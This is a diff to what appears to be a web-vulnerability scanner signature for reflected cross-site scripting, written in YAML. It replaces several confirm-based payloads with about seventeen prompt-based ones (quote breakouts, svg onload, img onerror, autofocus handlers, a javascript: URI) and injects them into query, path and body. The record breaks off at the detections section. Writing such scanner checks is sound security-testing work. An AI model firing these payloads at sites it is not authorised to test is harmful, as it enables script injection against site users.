@@ -6,25 +6,40 @@ info:
   risk: High
 
 # origin: gonna come from Burp
+variables:
+    - prefix : |  
+        #
 payloads:
-    - \"-confirm`1`//
-    - \"-confirm`1`-\"
-    - \'-confirm`1`//
-    - \'-confirm`1`-\'
-    - \'\"><svg/onload=confirm`1`>
-    - confirm`1`
-    - javascript:confirm`1`//
-    - </script><svg/onload=confirm`1`>
+
+    - javascript:(prompt)(1)
+    - \'(prompt)(1)-\'
+    - \"-(prompt)(1)-\"
+    - \'}(prompt)(1);{\'
+    - \"}(prompt)(1)%0A{\"
+    - (prompt)(1)//
+    - \';-(prompt)(1)//
+    - \\'-(prompt)(1)//
+    - \\\"-(prompt)(1)//
+    - \";-(prompt)(1)//
+    - \*/;(prompt)(1);/*
+    - \'autofocus/onfocus=(prompt)(1)//
+    - \"autofocus/onfocus=(prompt)(1)//
+    - </script><svg/onload=(prompt)()>
+    - <img src=1 onerror=(prompt)(1)>
+    - /\"><svg/onload=(prompt)(1)>
+    - <something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>
+      
     
 requests:
   #- method: GET
   - engine: chrome
     redirect: true
     generators:
-      # Change exist content type or adding new one
-      - Query("[[.original]]{{.payload}}")
+      #Change exist content type or adding new one
+      #- Query("[[.original]]{{.payload}}")
       - Query("{{.payload}}")
-      - Path("[[.original]]{{.payload}}", "*")
+      - Path("[[.original]]{{.payload}}")
+      - Path("[[.original]]{{.prefix}}{{.payload}}", "last")
       - Body ("{{.payload}}", "*")     
     detections:
       - >-
